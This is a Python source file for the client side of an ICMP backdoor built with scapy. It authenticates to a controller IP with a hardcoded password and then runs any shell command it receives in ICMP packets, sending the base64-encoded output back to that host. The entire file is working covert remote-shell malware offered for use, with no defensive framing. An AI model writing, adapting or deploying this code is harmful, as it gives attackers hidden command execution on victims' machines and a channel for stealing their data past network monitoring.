# By my-0day / p1s1o. Inspired by https://github.com/krabelize/icmpdoor

from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
import os
import json
import base64
import time
import threading

class IcmpClient():
    def __init__(self, interface, destination_ip):
        self.ICMP_ID = int(13170)
        self.TTL = int(64)
        self.interface = interface
        self.destination_ip = destination_ip
        self.authenticated = False
        try:
            from scapy.all import sr,IP,ICMP,Raw,sniff
        except ImportError:
            print("Install the Py3 scapy module")
            raise SystemExit



    def authenticate(self):
    	auth_pkt = (IP(dst=self.destination_ip, ttl=self.TTL)/ICMP(type=0, id=self.ICMP_ID)/Raw(load='{"Pwd":"1337"}'))
    	sr(auth_pkt, timeout=0, verbose=0)

    def icmpshell(self,pkt):
        if "_4UTH*@_" == pkt[Raw].load.decode('utf-8', errors='ignore').replace('\n','')[:8]:
            self.authenticated = True
            print("Connection Established")
        elif pkt[IP].src == self.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == self.ICMP_ID and pkt[Raw].load:
            icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
            icmp_json = json.loads(icmppaket)
            p_id = icmp_json["p_id"]
            cmd = icmp_json["cmd"]
            payload = "".join(os.popen(cmd).readlines()).strip()
            payload_b64 = base64.b64encode(payload.encode()).decode()
            icmppacket = (IP(dst=self.destination_ip, ttl=self.TTL)/ICMP(type=0, id=self.ICMP_ID)/Raw(load='{"p_id":"'+p_id+'","response":"'+str(payload_b64)+'"}'))
            sr(icmppacket, timeout=0, verbose=0)
        else:
            pass

    def sniffer(self):
        sniff(iface=self.interface, prn=self.icmpshell, filter="icmp", store="0")

    def main(self):
        t = threading.Thread(target=self.sniffer)
        t.start()
        while not self.authenticated:
            self.authenticate()
            time.sleep(1)
        

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

print("[+] ICMP Client Running.")
Client = IcmpClient(args.interface, args.destination_ip)
Client.main()
